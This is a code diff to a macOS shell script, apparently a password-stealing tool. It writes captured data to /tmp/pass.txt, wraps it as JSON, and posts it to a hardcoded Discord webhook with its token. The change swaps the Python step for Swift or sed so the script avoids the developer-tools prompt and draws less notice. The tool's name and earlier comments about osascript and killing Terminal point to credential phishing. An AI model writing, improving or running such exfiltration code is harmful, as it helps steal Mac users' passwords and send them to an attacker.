@@ -11,8 +11,8 @@
 # - Finally, it force-kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and either python3 (with developer tools installed) 
-#     or python2/python available.
+#   - macOS with osascript, curl, and either Xcode (for swift) installed or
+#     falling back to standard shell utilities.
 #
 # Usage:
 #   chmod +x combined_script.sh
@@ -119,21 +119,28 @@ else
     # --- Save Data to Temporary File ---
     echo -e "$capture" > /tmp/pass.txt
     
-    # --- Determine Python Interpreter Avoiding CLT Prompt ---
-    # Prefer python3 if the developer tools are installed.
-    if command -v python3 &>/dev/null && xcode-select -p &>/dev/null; then
-        PYTHON=python3
-    elif command -v python2 &>/dev/null; then
-        PYTHON=python2
-    elif command -v python &>/dev/null; then
-        PYTHON=python
+    # --- Generate JSON Payload Without Python ---
+    # First try to use swift (available with Xcode) to generate JSON.
+    if command -v swift &>/dev/null; then
+        payload=$(cat /tmp/pass.txt | swift <<'EOF'
+import Foundation
+var input = ""
+while let line = readLine() {
+    input += line + "\n"
+}
+input = input.trimmingCharacters(in: .whitespacesAndNewlines)
+let jsonObject = ["content": input]
+if let jsonData = try? JSONSerialization.data(withJSONObject: jsonObject, options: []),
+   let jsonString = String(data: jsonData, encoding: .utf8) {
+    print(jsonString)
+}
+EOF
+)
     else
-        echo "No suitable Python interpreter found."
-        exit 1
+        # Fallback to a sed-based method.
+        json_content=$(sed ':a;N;$!ba;s/\n/\\n/g' /tmp/pass.txt | sed 's/"/\\"/g')
+        payload=$(printf '{"content": "%s"}' "$json_content")
     fi
-    
-    # --- Generate JSON Payload ---
-    payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < /tmp/pass.txt)
     
     # --- Send Payload to Discord Webhook ---
     DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
